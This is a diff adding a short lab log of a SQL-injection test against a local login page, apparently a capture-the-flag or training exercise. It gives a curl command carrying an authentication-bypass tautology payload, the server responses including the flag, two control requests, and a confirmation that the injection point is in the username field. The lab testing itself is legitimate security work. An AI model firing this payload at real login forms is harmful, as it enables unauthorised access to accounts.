@@ -1,0 +1,12 @@
+Probe (benign tautology, read-only, no payload beyond auth bypass):
+curl -X POST -d "user=%27+OR+%271%27%3D%271%27+--+-&pass=x" http://127.0.0.1:18080/login
+-> HTTP/1.0 200, body:
+<h1>Logged in</h1><p>Welcome ' OR '1'='1' -- -</p><p>Flag: FLAG{helmpi_local_lab_ok}</p>
+
+Control A (invalid creds): user=nosuchuser123&pass=wrong
+-> <h1>Login failed</h1><p>Invalid credentials</p>
+
+Control B (legit creds from page hint): user=admin&pass=admin123
+-> <h1>Logged in</h1><p>Welcome admin</p><p>Flag: FLAG{helmpi_local_lab_ok}</p>
+
+Differential: tautology payload authenticates with arbitrary password while a non-matching user fails -> injection point confirmed in `user`, response reflects raw payload unescaped.
